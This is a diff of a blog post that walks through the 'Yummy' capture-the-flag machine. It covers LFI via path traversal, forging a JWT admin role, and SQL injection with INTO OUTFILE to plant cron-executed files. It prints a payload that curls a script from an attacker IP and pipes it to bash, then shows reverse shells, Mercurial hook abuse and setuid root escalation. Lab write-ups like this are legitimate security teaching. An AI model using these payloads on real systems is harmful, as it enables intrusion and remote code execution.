@@ -9,91 +9,91 @@ thumb: /assets/images/logos/5ca57613886666c4c33ef23876b3f054.webp
 # Yummy
 
 # 1. Enumeration
-
+<br/><br/>
 Start using nmap, there are just two ports open, ssh is there which means we will try to get some password
-
+<br/><br/>
 ![image.png]({{ '/assets/images/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1_image.png' | relative_url }})
-
+<br/><br/>
 In the port 80 there is a web application which theme is something about food
-
+<br/><br/>
 ![image.png]({{ '/assets/images/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1_image_1.png' | relative_url }})
-
+<br/><br/>
 If we search a little bit more of what is powering this page, we can see that they are using a bootstrap template in the front end
-
+<br/><br/>
 ![image.png]({{ '/assets/images/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1_image_2.png' | relative_url }})
-
+<br/><br/>
 We can register as a new user
-
+<br/><br/>
 ![image.png]({{ '/assets/images/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1_image_3.png' | relative_url }})
-
+<br/><br/>
 # 2. User flag
-
+<br/><br/>
 And we are going to be able to book a table, here we could try to exploit different attacks such as SSTI or XSS but it didn’t work
-
+<br/><br/>
 ![image.png]({{ '/assets/images/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1_image_4.png' | relative_url }})
-
+<br/><br/>
 Once we save the reservation we will be able to download it, using burpsuite we are going to see what is going on, where is that file taken from
-
+<br/><br/>
 ![image.png]({{ '/assets/images/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1_image_5.png' | relative_url }})
-
+<br/><br/>
 It is used a JWT token and we are being redirected to the path where the .ics is downloaded. 
-
+<br/><br/>
 ![image.png]({{ '/assets/images/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1_image_6.png' | relative_url }})
-
+<br/><br/>
 ![image.png]({{ '/assets/images/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1_image_7.png' | relative_url }})
-
+<br/><br/>
 Just there is where we gonna test LFI using path traversal
-
+<br/><br/>
 ![image.png]({{ '/assets/images/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1_image_8.png' | relative_url }})
-
+<br/><br/>
 Effectively it is vulnerable, taking /etc/passwd we already have enumerate users in the machine
-
+<br/><br/>
 ![image.png]({{ '/assets/images/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1_image_9.png' | relative_url }})
-
+<br/><br/>
 In this file we found that caddy server is running, it is also disclosed in the response header. But from now we need to find a way or path where we can find the backend application or something like that. I created a script where i took the token and exploit the vulnerability fuzzing /proc/<pid>/cmdline but that didn’t work, there are no much processes running on it
-
+<br/><br/>
 ![image.png]({{ '/assets/images/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1_image_10.png' | relative_url }})
-
+<br/><br/>
 Next step is try to get jobs or tasks that are being executed taking /etc/crontab
-
+<br/><br/>
 ![image.png]({{ '/assets/images/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1_image_11.png' | relative_url }})
-
+<br/><br/>
 There are different paths related with the automation of tasks in the web application
-
+<br/><br/>
 ![image.png]({{ '/assets/images/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1_image_12.png' | relative_url }})
-
+<br/><br/>
 Starting at the beginning we try with app_backup.sh 
-
+<br/><br/>
 ![image.png]({{ '/assets/images/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1_image_13.png' | relative_url }})
-
+<br/><br/>
 Basically it is zipping the folder where it is supposed the app hosted, that a big clue, let’s try to get the famous app.py present in the majority of web application that runs python behind
-
+<br/><br/>
 ![image.png]({{ '/assets/images/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1_image_14.png' | relative_url }})
-
+<br/><br/>
 ![image.png]({{ '/assets/images/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1_image_15.png' | relative_url }})
-
+<br/><br/>
 Good luck! We finally get the backend information, there we have a db password, but it didn’t work in ssh
-
+<br/><br/>
 ![image.png]({{ '/assets/images/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1_image_16.png' | relative_url }})
-
+<br/><br/>
 A validation process is being made, it is checking for the administrator role, that’s a good point because having a JWT token we probably need to take it, decode it and change the role
-
+<br/><br/>
 ![image.png]({{ '/assets/images/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1_image_17.png' | relative_url }})
-
+<br/><br/>
 ![image.png]({{ '/assets/images/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1_image_18.png' | relative_url }})
-
+<br/><br/>
 A role is there, it’s time to find a way to decode the token and change the role 
-
+<br/><br/>
 ![image.png]({{ '/assets/images/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1_image_19.png' | relative_url }})
-
+<br/><br/>
 app.py give us the way 
-
+<br/><br/>
 ![image.png]({{ '/assets/images/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1_image_20.png' | relative_url }})
-
+<br/><br/>
 ![image.png]({{ '/assets/images/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1_image_21.png' | relative_url }})
-
+<br/><br/>
 ![image.png]({{ '/assets/images/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1_image_22.png' | relative_url }})
-
+<br/><br/>
 ```coffeescript
 #!/usr/bin/python3
 
@@ -164,127 +164,130 @@ if __name__ == "__main__":
     print(f'Nuevo token: {new_token}')
 
 ```
-
+<br/><br/>
 Once inside as administrator, we have access to all the reservations made by users, and we are able to search them by email.
-
+<br/><br/>
 ![image.png]({{ '/assets/images/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1_image_23.png' | relative_url }})
-
+<br/><br/>
 Remember that we have access to some files thanks to LFI and path traversal
-
+<br/><br/>
 In app.py we can realize there are no sanitization for the input in the sql query
-
+<br/><br/>
 ![image.png]({{ '/assets/images/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1_image_24.png' | relative_url }})
-
+<br/><br/>
 and we know that in crontab there are some automation tasks which perform actions in the database, let’s dig into it
-
+<br/><br/>
 ![image.png]({{ '/assets/images/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1_image_25.png' | relative_url }})
-
+<br/><br/>
 Begin inspecting `/data/scripts/dbmonitor.sh`
-
+<br/><br/>
 Making a general scanning we know that this is an automation to check database state, looking for the service ran by sql
-
+<br/><br/>
 First, it checks if the database is not active, but we are not going to focus on there because the normal state of the database is active 
-
+<br/><br/>
 ![image.png]({{ '/assets/images/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1_image_26.png' | relative_url }})
-
+<br/><br/>
 That’s why we are focusing in the else statement, which represents when the database is active
-
+<br/><br/>
 There is logic of the code checks if the file `/data/scripts/dbstatus.json` exists, this file normally is created when the database has been down, but as we said the database normal state is up. So we are going to use the next injection to create that `file%3b++select+"anything"+INTO+OUTFILE++'/data/scripts/dbstatus.json'+%3b`
-
+<br/><br/>
 that’s how we are going to create  `/data/scripts/dbstatus.json` to get into the if statement
-
+<br/><br/>
 ![image.png]({{ '/assets/images/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1_image_27.png' | relative_url }})
-
+<br/><br/>
 Here the script checks if the string `database is down` is present in `/data/scripts/dbstatus.json` but we have write anything in the file, that’s makes us go to the else, there the script interpret that something went wrong with the database and it will find the latest version of `/data/scripts/fixer_v`  once that file is saved in a variable it will be executed with `/bin/bash`
-
+<br/><br/>
 ![image.png]({{ '/assets/images/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1_image_28.png' | relative_url }})
-
+<br/><br/>
 Now we know how we can get RCE we just need to create another file named `/data/scripts/fixer-v___` writing a reverse shell, or a command calling a reverse shell, making this injection it will be taken as the latest version and it will be executed
-
+<br/><br/>
 ```bash
 %3b++select+"ping+10.10.14.62%3b"+INTO+OUTFILE++'/data/scripts/dbstatus.json'+%3b
 %3b++select+"curl%2010.10.14.62:8000/rev.sh%20%7Cbash"+INTO+OUTFILE++'/data/scripts/fixer-v___'+%3b
 ```
-
+<br/><br/>
 Now we have access as sql user, it’s time to make a lateral movement as www-data
-
+<br/><br/>
 ![image.png]({{ '/assets/images/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1_image_29.png' | relative_url }})
-
+<br/><br/>
 we have full access over scripts directory
-
+<br/><br/>
 ![image.png]({{ '/assets/images/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1_image_30.png' | relative_url }})
-
+<br/><br/>
 And as we remember app_backup.sh is executed by www-data user
-
+<br/><br/>
 ![image.png]({{ '/assets/images/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1_image_31.png' | relative_url }})
-
+<br/><br/>
 create a simple reverse shell 
-
+<br/><br/>
 ![image.png]({{ '/assets/images/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1_image_32.png' | relative_url }})
-
+<br/><br/>
 Move it to app_backup.sh overwriting it
-
+<br/><br/>
 ![image.png]({{ '/assets/images/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1_image_33.png' | relative_url }})
-
+<br/><br/>
 ![image.png]({{ '/assets/images/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1_image_34.png' | relative_url }})
-
+<br/><br/>
 Now as data, we are able to see some files into home
-
+<br/><br/>
 ![image.png]({{ '/assets/images/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1_image_35.png' | relative_url }})
-
+<br/><br/>
 ![image.png]({{ '/assets/images/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1_image_36.png' | relative_url }})
-
+<br/><br/>
 Try to find a password in plain text
-
+<br/><br/>
 ![image.png]({{ '/assets/images/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1_image_37.png' | relative_url }})
-
+<br/><br/>
 And get the credentials to get user flag
-
+<br/><br/>
 ![image.png]({{ '/assets/images/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1_image_38.png' | relative_url }})
-
+<br/><br/>
 # 3.Priv esc
-
+<br/><br/>
 As qa we can see that mercurial (hg) is implemented on the system and we have read permissions to its configuration file
-
+<br/><br/>
 ![image.png]({{ '/assets/images/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1_image_39.png' | relative_url }})
-
+<br/><br/>
 We also can execute configuration as dev user
-
+<br/><br/>
 ![image.png]({{ '/assets/images/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1_image_40.png' | relative_url }})
-
+<br/><br/>
 Let’s copy it to tmp to perform some changes
-
+<br/><br/>
 ![image.png]({{ '/assets/images/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1_image_41.png' | relative_url }})
-
+<br/><br/>
 ![image.png]({{ '/assets/images/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1_image_42.png' | relative_url }})
-
+<br/><br/>
 There is a way using hooks to execute commands through it
-
+<br/><br/>
 ![image.png]({{ '/assets/images/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1_image_43.png' | relative_url }})
-
+<br/><br/>
 We have three options but post is more convenient and as we saw before we can execute pull command
-
+<br/><br/>
 ![image.png]({{ '/assets/images/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1_image_44.png' | relative_url }})
-
+<br/><br/>
 Let’s change the file configuration making execute a rev shell when pull action is performed
-
+<br/><br/>
 ![image.png]({{ '/assets/images/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1_image_45.png' | relative_url }})
-
+<br/><br/>
 Let’s pull the project, due a bad configuration the binary will search any path as `/.hg/.hgrc` it executes out malicious file configuration
-
+<br/><br/>
 ![image.png]({{ '/assets/images/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1_image_46.png' | relative_url }})
-
+<br/><br/>
 And we have made a lateral movement owning dev user, check for privileged commands  with `sudo -l`
-
+<br/><br/>
 ![image.png]({{ '/assets/images/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1_image_47.png' | relative_url }})
-
+<br/><br/>
 We can run as sudo a synchronization between the production part of the web application and the web application indeed, so we create a bash with a set uid and the run that command using 
-
+<br/><br/>
 `—chown root:root` making root as the owner to bypass setuid filter
-
+<br/><br/>
 then just making bash -p we can be able to we root, we need to run everything consecutively to make it effective
-
+<br/><br/>
 ![image.png]({{ '/assets/images/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1_image_48.png' | relative_url }})
-
+<br/><br/>
 Machine pwned!!!
 <script src="{{ '/assets/js/matrix-overlay.js' | relative_url }}"></script>
+
+
+<link rel="stylesheet" href="{{ '/assets/css/imagesstyle.css' | relative_url }}">
